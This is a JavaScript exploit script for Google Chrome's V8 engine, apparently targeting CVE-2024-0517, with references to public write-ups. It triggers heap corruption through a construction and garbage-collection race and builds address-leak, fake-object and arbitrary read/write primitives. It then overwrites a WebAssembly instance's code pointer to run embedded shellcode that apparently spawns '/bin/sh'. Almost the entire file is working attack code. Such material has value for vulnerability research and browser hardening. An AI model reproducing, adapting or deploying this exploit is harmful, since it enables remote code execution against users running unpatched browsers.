// References: 
//    https://blog.exodusintel.com/2024/01/19/google-chrome-v8-cve-2024-0517-out-of-bounds-write-code-execution/
//    https://github.com/mistymntncop/CVE-2023-3079/blob/main/exploit.js

const FIXED_ARRAY_HEADER_SIZE = 0x08n;
var arr_buf = new ArrayBuffer(8);
var f64_arr = new Float64Array(arr_buf);
var b64_arr = new BigInt64Array(arr_buf);
function ftoi(f) {
  f64_arr[0] = f;
  return b64_arr[0];
}
function itof(i) {
  b64_arr[0] = i;
  return f64_arr[0];
}
function smi(i) {
  return i << 1n;
}
function hex(i) {
  return i.toString(16);
}

function gc_minor() {
  for (let i = 0; i < 1000; ++i) {
    new ArrayBuffer(0x10000);
  }
}
function gc_major() {
  new ArrayBuffer(0x7fe00000);
}

var corrupted_object = null;
var large_arr = new Array(0x10000);
large_arr.fill(itof(0xDEADBEE0n));
var fake_arr = null;
var fake_arr_addr = null;
var fake_arr_elements_addr = null;

var packed_double_map = null;
var packed_double_properties = null;

var packed_map = null;
var packed_properties = null;
function get_corrupted_object() {
  let corrupted_object = null;
  let do_gc = false;
  function do_minor_gc() {
    if (do_gc) {
      gc_minor()
    }
  }

  let empty_obj = {};
  let empty_arr = [];
  class ClassParent {
  }
  class ClassBug extends ClassParent {
    constructor () {
      const v24 = new new.target();
      let packed_arr = [empty_obj, empty_obj, empty_obj, empty_obj, empty_obj, empty_obj, empty_obj, empty_obj, empty_obj, empty_obj];

      super();

      let double_arr = [13.37];

      this.packed_arr = packed_arr;
      this.double_arr = double_arr;
      JSON.stringify(empty_arr);
    }
    [1] = do_minor_gc();
  }

  for (let i = 0; i < 200; ++i) {
    do_gc = true;
    if (i % 2) {
      do_gc = false;
    }
    do_minor_gc();
  }

  for (let i = 0; i < 650; ++i) {
    if (i == 640 || i == 647 || i == 648 || i == 649) {
      do_gc = true;
      do_minor_gc();
      do_gc = false;
    }

    if (i == 649) {
      do_gc = true;
    }

    let x = Reflect.construct(ClassBug, empty_arr, ClassParent);

    if (i == 649) {
      corrupted_object = x;
    }
  }

  return corrupted_object;
}
function install_primitives() {
  function weak_addr_of(obj) {
    corrupted_object.packed_arr[0] = obj;
    return ftoi(corrupted_object.double_arr[0]) & 0xFFFFFFFFn;
  }

  // Modify corrupted_object.double_arr.length.
  corrupted_object.packed_arr[5] = 0x100000n;

  // Leak addrs.
  let packed_arr = corrupted_object.packed_arr;
  let packed_arr_addr = weak_addr_of(packed_arr);
  let packed_arr_elements_addr = packed_arr_addr + 0x24n;
  let packed_double_arr = corrupted_object.double_arr;
  let packed_double_arr_addr = weak_addr_of(packed_double_arr);

  // Leak large_arr.elements addr
  //// Set packed_double_arr.elements to large_arr + FIXED_ARRAY_HEADER_SIZE.
  packed_arr[4] = large_arr;
  let large_arr_elements_addr = ftoi(packed_double_arr[0]) & 0xFFFFFFFFn;
  fake_arr_addr = large_arr_elements_addr + 0x8n;
  fake_arr_elements_addr = fake_arr_addr + 0x10n;

  // Leak map of fixed_arr
  //// Set packed_double_arr.elements to packed_double_arr + FIXED_ARRAY_HEADER_SIZE.
  packed_arr[4] = packed_double_arr;
  //// Set packed_double_arr.elements to packed_arr.elements.
  packed_double_arr[0] = itof((smi(0x1000n) << 32n) | (packed_arr_elements_addr - FIXED_ARRAY_HEADER_SIZE));
  let fixed_arr_map = ftoi(packed_double_arr[0]) & 0xFFFFFFFFn;;

  // Leak map and propertis of packed double object
  //// Set packed_double_arr.elements to packed_double_arr + FIXED_ARRAY_HEADER_SIZE.
  packed_arr[4] = packed_double_arr;
  //// Set packed_double_arr.elements to packed_double_arr.
  packed_double_arr[0] = itof((smi(0x1000n) << 32n) | (packed_double_arr_addr - FIXED_ARRAY_HEADER_SIZE));
  let packed_double_map_and_properties = ftoi(packed_double_arr[0]);
  packed_double_map = packed_double_map_and_properties & 0xFFFFFFFFn;
  packed_double_properties = packed_double_map_and_properties >> 32n;

  // Leak map and properties packed object
  //// Set packed_double_arr.elements to packed_double_arr + FIXED_ARRAY_HEADER_SIZE.
  packed_arr[4] = packed_double_arr;
  //// Set packed_double_arr.elements to packed_arr.
  packed_double_arr[0] = itof((smi(0x1000n) << 32n) | (packed_arr_addr - FIXED_ARRAY_HEADER_SIZE));
  let packed_map_and_properties = ftoi(packed_double_arr[0]);
  packed_map = packed_map_and_properties & 0xFFFFFFFFn;
  packed_properties = packed_map_and_properties >> 32n;

  // Make fake_arr; fake_arr locates on large_arr.elements
  //// Set packed_arr.elements to large_arr.elements.
  packed_double_arr[1] = itof((smi(0x1000n) << 32n) | large_arr_elements_addr);
  //// Set values for fake_arr.
  large_arr[0] = itof((packed_double_properties << 32n) | packed_double_map);
  large_arr[1] = itof((smi(0x1000n) << 32n) | fake_arr_elements_addr);
  large_arr[2] = itof((smi(0x01n) << 32n) | fixed_arr_map);
  //// Set packed_arr[6] and [7] to fake_arr to get fake_arr.
  large_arr[3] = itof((fake_arr_addr << 32n) | fake_arr_addr);
  fake_arr = packed_arr[6];
}
function addr_of(obj) {
  large_arr[0] = itof((packed_properties << 32n) | packed_map);
  large_arr[1] = itof((smi(0x1000n) << 32n) | fake_arr_elements_addr);
  fake_arr[0] = obj;

  large_arr[0] = itof((packed_double_properties << 32n) | packed_double_map);
  return ftoi(fake_arr[0]) & 0xFFFFFFFFn;
}
function fake_obj(addr) {
  large_arr[0] = itof((packed_double_properties << 32n) | packed_double_map);
  large_arr[1] = itof((smi(0x1000n) << 32n) | fake_arr_elements_addr);
  fake_arr[0] = itof((addr << 32n) | addr);

  large_arr[0] = itof((packed_properties << 32n) | packed_map);
  return fake_arr[0];
}
function heap_read64(addr) {
  large_arr[0] = itof((packed_double_properties << 32n) | packed_double_map);
  large_arr[1] = itof((smi(0x1000n) << 32n) | (addr - FIXED_ARRAY_HEADER_SIZE));
  return ftoi(fake_arr[0]);
}
function heap_read32(addr) {
  return heap_read64(addr) & 0xFFFFFFFFn;
}
function heap_write64(addr, val) {
  large_arr[0] = itof((packed_double_properties << 32n) | packed_double_map);
  large_arr[1] = itof((smi(0x1000n) << 32n) | (addr - FIXED_ARRAY_HEADER_SIZE));

  fake_arr[0] = itof(val);
}
function heap_write32(addr, val) {
  let original_val = heap_read64(addr);
  let new_val = (original_val & 0xFFFFFFFF00000000n) | val;
  heap_write64(addr, new_val);
}

function get_full_aar_aaw() {
  let shell_wasm_code = new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 17, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 133, 1, 1, 130, 1, 0, 65, 0, 68, 0, 0, 0, 0, 0, 0, 0, 0, 57, 3, 0, 65, 0, 68, 106, 59, 88, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 104, 47, 115, 104, 0, 91, 235, 11, 57, 3, 0, 65, 0, 68, 104, 47, 98, 105, 110, 89, 235, 11, 57, 3, 0, 65, 0, 68, 72, 193, 227, 32, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 1, 203, 83, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 137, 231, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 49, 246, 72, 49, 210, 235, 11, 57, 3, 0, 65, 0, 68, 15, 5, 144, 144, 144, 144, 235, 11, 57, 3, 0, 65, 42, 11
  ]);
  let shell_wasm_module = new WebAssembly.Module(shell_wasm_code);
  let shell_wasm_instance = new WebAssembly.Instance(shell_wasm_module);
  let shell_func = shell_wasm_instance.exports.main;
  shell_func();

  let shell_wasm_instance_addr = addr_of(shell_wasm_instance);
  let shell_wasm_rwx_addr = heap_read64(shell_wasm_instance_addr + 0x48n);
  let shell_func_code_addr = shell_wasm_rwx_addr + 0xB40n;
  let shell_code_addr = shell_func_code_addr + 0x2Dn;

  let fake_wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
  let fake_wasm_module = new WebAssembly.Module(fake_wasm_code);
  let fake_wasm_instance = new WebAssembly.Instance(fake_wasm_module);
  let fake_func = fake_wasm_instance.exports.main;

  let fake_wasm_instance_addr = addr_of(fake_wasm_instance);
  heap_write64(fake_wasm_instance_addr + 0x48n, shell_code_addr);

  fake_func();
}

function pwn() {
  corrupted_object = get_corrupted_object();
  install_primitives();
  get_full_aar_aaw();
}

pwn();
